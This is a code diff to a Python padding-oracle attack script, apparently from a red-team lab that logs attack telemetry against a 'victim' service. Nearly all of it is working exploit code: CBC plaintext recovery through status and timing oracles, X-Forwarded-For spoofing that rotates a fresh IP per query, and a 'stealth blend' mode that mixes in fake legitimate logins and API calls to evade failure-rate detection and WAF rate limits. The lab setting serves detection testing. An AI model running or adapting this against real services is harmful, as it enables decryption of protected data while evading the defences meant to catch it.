@@ -10,28 +10,27 @@ from common.crypto_utils import b64d, b64e, pkcs7_unpad
 from common.event_logger import emit_event
 
 
-def get_local_ip() -> str:
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except Exception:
-        return "127.0.0.1"
-
-
-LOCAL_IP = get_local_ip()
+STATIC_REDTEAM_IP = "198.51.100.50"
 GLOBAL_IP_MODE = "static"
 GLOBAL_RAND_IP = f"198.51.100.{random.randint(2, 250)}"
+GLOBAL_PER_QUERY_COUNTER = 0
 
 
 def get_attack_ip() -> str:
+    global GLOBAL_PER_QUERY_COUNTER
+    if GLOBAL_IP_MODE == "per-query":
+        GLOBAL_PER_QUERY_COUNTER += 1
+        # Generate sequential IP from 203.0.0.0/16 subnet:
+        # 203.0.1.1 to 203.0.254.254 (up to 64,516 unique ephemeral IPs)
+        subnet_b = (GLOBAL_PER_QUERY_COUNTER // 250) % 250 + 1
+        host_c = (GLOBAL_PER_QUERY_COUNTER % 250) + 1
+        return f"203.0.{subnet_b}.{host_c}"
     if GLOBAL_IP_MODE == "rotate":
         return f"203.0.113.{random.randint(2, 250)}"
     if GLOBAL_IP_MODE == "random":
         return GLOBAL_RAND_IP
-    return LOCAL_IP
+    return STATIC_REDTEAM_IP
+
 
 
 class WafBlockedException(Exception):
@@ -41,48 +40,205 @@ class WafBlockedException(Exception):
 
 def parse_args() -> argparse.Namespace:
     p = argparse.ArgumentParser()
-    p.add_argument("--target", default="http://victim-vuln:8080")
+    p.add_argument("--target", default="http://victim:8080")
     p.add_argument("--mode", choices=["vuln", "timing"], default="vuln")
     p.add_argument("--sleep-ms", type=float, default=4.0)
     p.add_argument("--scenario-id", default="attack-demo")
-    p.add_argument("--ip-mode", choices=["static", "random", "rotate"], default="static")
+    p.add_argument("--ip-mode", choices=["static", "random", "rotate", "per-query"], default="static")
+    p.add_argument("--blend-noise", action="store_true", help="Blend legitimate HTTP 200 requests to evade simple failure-rate detection")
     return p.parse_args()
 
 
-def decrypt_oracle_status(base_url: str, token: bytes) -> tuple[int, float]:
+
+class StealthBlendSession:
+    """Manages realistic multi-transaction background traffic for advanced stealth evasion."""
+
+    def __init__(self, base_url: str):
+        self.base_url = base_url
+        self.session = requests.Session()
+        self.token = ""
+        self.valid_sample_token = ""
+        self.last_encrypted_token = ""
+        self.username = f"analyst_ops_{random.randint(10, 99)}"
+
+    def do_blend_batch(self, scenario_id: str, batch_size: int = 3, blend_ip: str | None = None) -> None:
+        """Executes a batch of diverse legitimate business requests (login, profile, encrypt, decrypt)."""
+        actions = ["login", "profile", "encrypt", "decrypt_valid", "health"]
+        for _ in range(batch_size):
+            action_type = random.choice(actions)
+            cur_ip = blend_ip or get_attack_ip()
+            headers = {
+                "X-Client-Role": "attacker",
+                "X-Client-ID": "attacker",
+                "X-Forwarded-For": cur_ip,
+            }
+            if self.token:
+                headers["Authorization"] = f"Bearer {self.token}"
+
+            try:
+                if action_type == "login" or not self.token:
+                    auth_body = {"username": self.username, "password": "CorporateSecret2026!"}
+                    start_t = time.perf_counter()
+                    r = self.session.post(f"{self.base_url}/api/v1/auth/login", json=auth_body, headers=headers, timeout=4)
+                    lat = (time.perf_counter() - start_t) * 1000
+                    if r.status_code == 200:
+                        self.token = r.json().get("access_token", "")
+                    emit_event(
+                        "attacker",
+                        {
+                            "event_type": "attack_noise_blend",
+                            "scenario_id": scenario_id,
+                            "src_ip": cur_ip,
+                            "endpoint": "/api/v1/auth/login",
+                            "status_code": r.status_code,
+                            "latency_ms": round(lat, 3),
+                            "error_type": "ok" if r.status_code == 200 else "auth_err",
+                            "details": {
+                                "action": "evasion_auth_login",
+                                "username": self.username,
+                                "status": r.status_code,
+                            },
+                        },
+                    )
+
+                elif action_type == "profile":
+                    start_t = time.perf_counter()
+                    r = self.session.get(f"{self.base_url}/api/v1/user/profile", headers=headers, timeout=4)
+                    lat = (time.perf_counter() - start_t) * 1000
+                    emit_event(
+                        "attacker",
+                        {
+                            "event_type": "attack_noise_blend",
+                            "scenario_id": scenario_id,
+                            "src_ip": cur_ip,
+                            "endpoint": "/api/v1/user/profile",
+                            "status_code": r.status_code,
+                            "latency_ms": round(lat, 3),
+                            "error_type": "ok" if r.status_code == 200 else "profile_err",
+                            "details": {"action": "evasion_profile_query", "status": r.status_code},
+                        },
+                    )
+
+                elif action_type == "encrypt":
+                    msg = f"AuditReport-{self.username}-{int(time.time()*1000)}"
+                    start_t = time.perf_counter()
+                    r = self.session.post(f"{self.base_url}/api/v1/crypto/encrypt", json={"plaintext": msg}, headers=headers, timeout=4)
+                    lat = (time.perf_counter() - start_t) * 1000
+                    if r.status_code == 200:
+                        self.last_encrypted_token = r.json().get("token", "")
+                    emit_event(
+                        "attacker",
+                        {
+                            "event_type": "attack_noise_blend",
+                            "scenario_id": scenario_id,
+                            "src_ip": cur_ip,
+                            "endpoint": "/api/v1/crypto/encrypt",
+                            "status_code": r.status_code,
+                            "latency_ms": round(lat, 3),
+                            "ciphertext_len": len(self.last_encrypted_token),
+                            "error_type": "ok" if r.status_code == 200 else "encrypt_err",
+                            "details": {
+                                "action": "evasion_encrypt_doc",
+                                "doc_id": msg,
+                                "ciphertext_bytes": len(self.last_encrypted_token),
+                            },
+                        },
+                    )
+
+                elif action_type == "decrypt_valid":
+                    token_to_send = self.last_encrypted_token or self.valid_sample_token
+                    if not token_to_send:
+                        samp_r = self.session.get(f"{self.base_url}/sample_token", headers=headers, timeout=4)
+                        if samp_r.status_code == 200:
+                            token_to_send = samp_r.json().get("token", "")
+                            self.valid_sample_token = token_to_send
+
+                    if token_to_send:
+                        start_t = time.perf_counter()
+                        r = self.session.post(f"{self.base_url}/api/v1/crypto/decrypt", json={"token": token_to_send}, headers=headers, timeout=4)
+                        lat = (time.perf_counter() - start_t) * 1000
+                        emit_event(
+                            "attacker",
+                            {
+                                "event_type": "attack_noise_blend",
+                                "scenario_id": scenario_id,
+                                "src_ip": cur_ip,
+                                "endpoint": "/api/v1/crypto/decrypt",
+                                "status_code": r.status_code,
+                                "latency_ms": round(lat, 3),
+                                "ciphertext_len": len(token_to_send),
+                                "error_type": "ok" if r.status_code == 200 else "decrypt_err",
+                                "details": {
+                                    "action": "evasion_decrypt_valid_token",
+                                    "valid_padding": r.status_code in (200, 403),
+                                    "status": r.status_code,
+                                },
+                            },
+                        )
+
+                else:
+                    start_t = time.perf_counter()
+                    r = self.session.get(f"{self.base_url}/health", headers=headers, timeout=4)
+                    lat = (time.perf_counter() - start_t) * 1000
+                    emit_event(
+                        "attacker",
+                        {
+                            "event_type": "attack_noise_blend",
+                            "scenario_id": scenario_id,
+                            "src_ip": cur_ip,
+                            "endpoint": "/health",
+                            "status_code": r.status_code,
+                            "latency_ms": round(lat, 3),
+                            "error_type": "ok",
+                            "details": {"action": "evasion_health_check", "status": r.status_code},
+                        },
+                    )
+            except Exception:
+                pass
+            time.sleep(0.010)
+
+
+def decrypt_oracle_status(base_url: str, token: bytes, custom_ip: str | None = None) -> tuple[int, float, str]:
     started = time.perf_counter()
-    cur_ip = get_attack_ip()
+    cur_ip = custom_ip or get_attack_ip()
     try:
         r = requests.post(
-            f"{base_url}/decrypt",
+            f"{base_url}/api/v1/crypto/decrypt",
             json={"token": b64e(token)},
             headers={"X-Client-Role": "attacker", "X-Client-ID": "attacker", "X-Forwarded-For": cur_ip},
             timeout=5,
         )
         latency = (time.perf_counter() - started) * 1000
-        return r.status_code, latency
+        return r.status_code, latency, cur_ip
     except Exception:
         latency = (time.perf_counter() - started) * 1000
-        return 503, latency
+        return 503, latency, cur_ip
 
 
-def decrypt_oracle_timing(base_url: str, token: bytes) -> tuple[bool, float, int]:
+def decrypt_oracle_timing(base_url: str, token: bytes, custom_ip: str | None = None) -> tuple[bool, float, int, str]:
     samples = []
     last_status = 200
+    used_ip = custom_ip or get_attack_ip()
     for _ in range(3):
-        status, ms = decrypt_oracle_status(base_url, token)
+        status, ms, used_ip = decrypt_oracle_status(base_url, token, used_ip)
         samples.append(ms)
         last_status = status
     avg_ms = float(statistics.mean(samples))
     is_fast = (avg_ms < 20.0) and (last_status != 429)
-    return is_fast, avg_ms, last_status
+    return is_fast, avg_ms, last_status, used_ip
 
 
-def has_status_oracle(base_url: str, token: bytes, probes: int = 24) -> bool:
-    baseline_status, _ = decrypt_oracle_status(base_url, token)
+def has_status_oracle(base_url: str, token: bytes, probes: int = 24) -> tuple[bool, bool]:
+    """Verifies if an HTTP 500 status oracle exists on tampered ciphertexts.
+    Returns (has_oracle: bool, is_waf_blocked: bool)
+    """
+    baseline_status, _, _ = decrypt_oracle_status(base_url, token)
+    if baseline_status == 429:
+        return False, True
     statuses = set()
     iv = bytearray(token[:16])
     c1 = token[16:32]
+    waf_blocks = 0
     for _ in range(probes):
         crafted_iv = bytearray(iv)
         idx = random.randint(0, 15)
@@ -91,9 +247,37 @@ def has_status_oracle(base_url: str, token: bytes, probes: int = 24) -> bool:
         while candidate == original:
             candidate = random.randint(0, 255)
         crafted_iv[idx] = candidate
-        status, _ = decrypt_oracle_status(base_url, bytes(crafted_iv) + c1)
+        status, _, _ = decrypt_oracle_status(base_url, bytes(crafted_iv) + c1)
         statuses.add(status)
-    return baseline_status != 500 and 500 in statuses
+        if status == 429:
+            waf_blocks += 1
+            if waf_blocks >= 2:
+                return False, True
+    return (baseline_status != 500 and 500 in statuses), False
+
+
+def has_timing_oracle(base_url: str, token: bytes, probes: int = 8) -> tuple[bool, bool]:
+    """Verifies that an observable timing differential exists on tampered ciphertexts.
+    Returns (has_oracle: bool, is_waf_blocked: bool)
+    """
+    latencies = []
+    iv = bytearray(token[:16])
+    c1 = token[16:32]
+    waf_blocks = 0
+    for _ in range(probes):
+        crafted_iv = bytearray(iv)
+        idx = random.randint(0, 15)
+        crafted_iv[idx] ^= random.randint(1, 255)
+        status, ms, _ = decrypt_oracle_status(base_url, bytes(crafted_iv) + c1)
+        latencies.append(ms)
+        if status == 429:
+            waf_blocks += 1
+            if waf_blocks >= 2:
+                return False, True
+    # A true timing oracle (such as victim-partial) delays on padding error (~30ms).
+    # Targets protected by Encrypt-then-MAC reject in constant time without artificial delay (< 15ms).
+    avg_probe_ms = statistics.mean(latencies) if latencies else 0.0
+    return (avg_probe_ms >= 20.0), False
 
 
 def padding_oracle_attack_block(
@@ -106,9 +290,14 @@ def padding_oracle_attack_block(
     scenario_id: str,
     sleep_ms: float,
     start_queries: int = 0,
+    blend_noise: bool = False,
+    blend_session: StealthBlendSession | None = None,
 ) -> tuple[bytes, int]:
     if len(prev_block) != 16 or len(target_block) != 16:
         raise ValueError("Blocks must be exactly 16 bytes")
+
+    if blend_noise and blend_session is None:
+        blend_session = StealthBlendSession(base_url)
 
     c_prev = bytearray(prev_block)
     c_target = target_block
@@ -125,19 +314,23 @@ def padding_oracle_attack_block(
 
         found = False
         for guess in range(256):
+            probe_ip = get_attack_ip()
+            # If stealth blend noise is enabled, interleave a batch of realistic positive transactions
+            if blend_noise and blend_session is not None:
+                blend_session.do_blend_batch(scenario_id, batch_size=2, blend_ip=probe_ip if GLOBAL_IP_MODE == "per-query" else None)
+
             attack_iv = bytearray(prefix)
             attack_iv[idx] = guess
             crafted = bytes(attack_iv) + c_target
             queries += 1
 
             if oracle_mode == "vuln":
-                status, latency = decrypt_oracle_status(base_url, crafted)
+                status, latency, probe_ip = decrypt_oracle_status(base_url, crafted, probe_ip)
                 valid_padding = (status in (200, 403))
             else:
-                valid_padding, latency, status = decrypt_oracle_timing(base_url, crafted)
+                valid_padding, latency, status, probe_ip = decrypt_oracle_timing(base_url, crafted, probe_ip)
                 if status == 429:
                     valid_padding = False
-
 
             # Check if victim WAF is actively dropping / blocking our requests
             if status == 429:
@@ -148,8 +341,8 @@ def padding_oracle_attack_block(
                         {
                             "event_type": "attack_blocked",
                             "scenario_id": scenario_id,
-                            "src_ip": get_attack_ip(),
-                            "endpoint": "/decrypt",
+                            "src_ip": probe_ip,
+                            "endpoint": "/api/v1/crypto/decrypt",
                             "status_code": 429,
                             "latency_ms": round(latency, 3),
                             "ciphertext_len": len(crafted),
@@ -173,8 +366,8 @@ def padding_oracle_attack_block(
                 {
                     "event_type": "attack_probe",
                     "scenario_id": scenario_id,
-                    "src_ip": get_attack_ip(),
-                    "endpoint": "/decrypt",
+                    "src_ip": probe_ip,
+                    "endpoint": "/api/v1/crypto/decrypt",
                     "status_code": status,
                     "latency_ms": round(latency, 3),
                     "ciphertext_len": len(crafted),
@@ -200,36 +393,35 @@ def padding_oracle_attack_block(
                     check_iv = bytearray(attack_iv)
                     check_iv[idx - 1] ^= 1
                     check_crafted = bytes(check_iv) + c_target
+                    check_ip = get_attack_ip() if GLOBAL_IP_MODE == "per-query" else probe_ip
                     if oracle_mode == "vuln":
-                        check_status, _ = decrypt_oracle_status(base_url, check_crafted)
+                        check_status, _, _ = decrypt_oracle_status(base_url, check_crafted, check_ip)
                         if check_status not in (200, 403):
                             continue
                     else:
-                        is_fast, _, _ = decrypt_oracle_timing(base_url, check_crafted)
+                        is_fast, _, _, _ = decrypt_oracle_timing(base_url, check_crafted, check_ip)
                         if not is_fast:
                             continue
 
                 intermediate[idx] = guess ^ pad_len
                 recovered[idx] = intermediate[idx] ^ c_prev[idx]
-                rec_byte = int(recovered[idx])
-                rec_char = chr(rec_byte) if 32 <= rec_byte < 127 else "."
+                rec_byte = recovered[idx]
+                rec_char = chr(rec_byte) if 32 <= rec_byte <= 126 else "."
+                # Emit recovery milestone event immediately on byte found
                 emit_event(
                     "attacker",
                     {
                         "event_type": "attack_progress",
                         "scenario_id": scenario_id,
-                        "src_ip": get_attack_ip(),
-                        "endpoint": "/decrypt",
+                        "src_ip": probe_ip,
+                        "endpoint": "/api/v1/crypto/decrypt",
                         "status_code": status,
                         "latency_ms": round(latency, 3),
-                        "ciphertext_len": len(crafted),
-                        "error_type": "padding_valid",
                         "details": {
                             "block_index": block_index,
                             "total_blocks": total_blocks,
                             "byte_index": idx,
                             "global_byte_index": (block_index - 1) * 16 + idx,
-                            "pad_len": pad_len,
                             "guess": guess,
                             "guess_hex": f"0x{guess:02x}",
                             "recovered_byte": rec_byte,
@@ -256,6 +448,7 @@ def padding_oracle_attack_all_blocks(
     oracle_mode: str,
     scenario_id: str,
     sleep_ms: float,
+    blend_noise: bool = False,
 ) -> tuple[bytes, int, list[bytes]]:
     if len(token) < 32 or len(token) % 16 != 0:
         raise ValueError("Token must be a multiple of 16 bytes and at least 32 bytes")
@@ -263,6 +456,7 @@ def padding_oracle_attack_all_blocks(
     num_blocks = (len(token) // 16) - 1
     recovered_blocks = []
     total_queries = 0
+    blend_session = StealthBlendSession(base_url) if blend_noise else None
 
     for b in range(1, num_blocks + 1):
         prev_block = token[(b - 1) * 16 : b * 16]
@@ -277,6 +471,8 @@ def padding_oracle_attack_all_blocks(
             scenario_id=scenario_id,
             sleep_ms=sleep_ms,
             start_queries=total_queries,
+            blend_noise=blend_noise,
+            blend_session=blend_session,
         )
         recovered_blocks.append(rec_b)
 
@@ -290,9 +486,10 @@ def padding_oracle_attack_first_block(
     oracle_mode: str,
     scenario_id: str,
     sleep_ms: float,
+    blend_noise: bool = False,
 ) -> tuple[bytes, int]:
     raw_payload, queries, blocks = padding_oracle_attack_all_blocks(
-        base_url, token, oracle_mode, scenario_id, sleep_ms
+        base_url, token, oracle_mode, scenario_id, sleep_ms, blend_noise=blend_noise
     )
     return blocks[0] if blocks else raw_payload, queries
 
@@ -302,19 +499,130 @@ def main() -> int:
     global GLOBAL_IP_MODE
     GLOBAL_IP_MODE = args.ip_mode
     try:
-        token_b64 = requests.get(
+        cur_ip = get_attack_ip()
+        start_rec = time.perf_counter()
+        resp = requests.get(
             f"{args.target}/sample_token",
-            headers={"X-Client-Role": "attacker", "X-Client-ID": "attacker", "X-Forwarded-For": get_attack_ip()},
+            headers={"X-Client-Role": "attacker", "X-Client-ID": "attacker", "X-Forwarded-For": cur_ip},
             timeout=5,
-        ).json()["token"]
+        )
+        token_b64 = resp.json()["token"]
+        lat_rec = (time.perf_counter() - start_rec) * 1000
+        token = b64d(token_b64)
+        calculated_blocks = max(1, (len(token) // 16) - 1)
+        # Emit reconnaissance event (HTTP 200)
+        emit_event(
+            "attacker",
+            {
+                "event_type": "attack_recon",
+                "scenario_id": args.scenario_id,
+                "src_ip": cur_ip,
+                "endpoint": "/sample_token",
+                "status_code": 200,
+                "latency_ms": round(lat_rec, 3),
+                "ciphertext_len": len(token),
+                "error_type": "ok",
+                "details": {
+                    "action": "reconnaissance_token_capture",
+                    "target": args.target,
+                    "ciphertext_len": len(token),
+                    "total_blocks": calculated_blocks,
+                },
+            },
+        )
     except Exception as e:
         print(f"[X] Impossibile recuperare sample_token: {e}")
         return 1
 
-    token = b64d(token_b64)
-    if args.mode == "vuln" and not has_status_oracle(args.target, token):
-        print("[!] Nessun oracolo basato su status 500 rilevato (bersaglio protetto o non vulnerabile).")
-        return 0
+    if args.mode == "vuln":
+        has_status, waf_blocked = has_status_oracle(args.target, token)
+        if waf_blocked:
+            emit_event(
+                "attacker",
+                {
+                    "event_type": "attack_blocked",
+                    "scenario_id": args.scenario_id,
+                    "src_ip": cur_ip,
+                    "endpoint": "/api/v1/crypto/decrypt",
+                    "status_code": 429,
+                    "latency_ms": round((time.perf_counter() - start_rec) * 1000, 3),
+                    "ciphertext_len": len(token),
+                    "error_type": "waf_blocked",
+                    "details": {
+                        "reason": "Exploit bloccato dal WAF preventivo (IP in quarantena già in fase di ricognizione)",
+                        "queries_total": 8,
+                    },
+                },
+            )
+            print("[!] Exploit bloccato dal WAF preventivo (IP in quarantena già in fase di ricognizione). 0 byte compromessi.")
+            return 0
+        if not has_status:
+            emit_event(
+                "attacker",
+                {
+                    "event_type": "attack_not_permitted",
+                    "scenario_id": args.scenario_id,
+                    "src_ip": cur_ip,
+                    "endpoint": "/api/v1/crypto/decrypt",
+                    "status_code": 403,
+                    "latency_ms": round((time.perf_counter() - start_rec) * 1000, 3),
+                    "ciphertext_len": len(token),
+                    "error_type": "not_permitted",
+                    "details": {
+                        "reason": "Attacco non consentito: Target protetto da Encrypt-then-MAC (HMAC autenticato a monte)",
+                        "queries_total": 24,
+                        "recovered_bytes": 0,
+                        "total_bytes": len(token),
+                    },
+                },
+            )
+            print("[🛡️] Attacco non consentito: Target protetto da Encrypt-then-MAC (HMAC autenticato a monte, exploit crittograficamente impossibile). 0 byte compromessi.")
+            return 0
+
+    if args.mode == "timing":
+        has_timing, waf_blocked = has_timing_oracle(args.target, token)
+        if waf_blocked:
+            emit_event(
+                "attacker",
+                {
+                    "event_type": "attack_blocked",
+                    "scenario_id": args.scenario_id,
+                    "src_ip": cur_ip,
+                    "endpoint": "/api/v1/crypto/decrypt",
+                    "status_code": 429,
+                    "latency_ms": round((time.perf_counter() - start_rec) * 1000, 3),
+                    "ciphertext_len": len(token),
+                    "error_type": "waf_blocked",
+                    "details": {
+                        "reason": "Exploit bloccato dal WAF preventivo (IP in quarantena già in fase di ricognizione)",
+                        "queries_total": 8,
+                    },
+                },
+            )
+            print("[!] Exploit bloccato dal WAF preventivo (IP in quarantena già in fase di ricognizione). 0 byte compromessi.")
+            return 0
+        if not has_timing:
+            emit_event(
+                "attacker",
+                {
+                    "event_type": "attack_not_permitted",
+                    "scenario_id": args.scenario_id,
+                    "src_ip": cur_ip,
+                    "endpoint": "/api/v1/crypto/decrypt",
+                    "status_code": 403,
+                    "latency_ms": round((time.perf_counter() - start_rec) * 1000, 3),
+                    "ciphertext_len": len(token),
+                    "error_type": "not_permitted",
+                    "details": {
+                        "reason": "Attacco non consentito: Target protetto da Encrypt-then-MAC (Nessun side-channel temporale rilevato)",
+                        "queries_total": 8,
+                        "recovered_bytes": 0,
+                        "total_bytes": len(token),
+                    },
+                },
+            )
+            print("[🛡️] Attacco non consentito: Target protetto da Encrypt-then-MAC (Nessun side-channel temporale rilevato). 0 byte compromessi.")
+            return 0
 
     started = time.perf_counter()
     try:
@@ -324,7 +632,9 @@ def main() -> int:
             args.mode,
             args.scenario_id,
             args.sleep_ms,
+            blend_noise=args.blend_noise,
         )
+
     except WafBlockedException as e:
         elapsed = time.perf_counter() - started
         print(f"[!] {e} in {elapsed:.2f}s. Exploit bloccato dal WAF preventivo.")
@@ -337,7 +647,7 @@ def main() -> int:
                 "event_type": "attack_error",
                 "scenario_id": args.scenario_id,
                 "src_ip": get_attack_ip(),
-                "endpoint": "/decrypt",
+                "endpoint": "/api/v1/crypto/decrypt",
                 "status_code": 500,
                 "latency_ms": round(elapsed * 1000, 3),
                 "error_type": "attack_failed",
@@ -372,7 +682,7 @@ def main() -> int:
             "event_type": "attack_complete",
             "scenario_id": args.scenario_id,
             "src_ip": get_attack_ip(),
-            "endpoint": "/decrypt",
+            "endpoint": "/api/v1/crypto/decrypt",
             "status_code": 200,
             "latency_ms": round(elapsed * 1000, 3),
             "ciphertext_len": len(token),
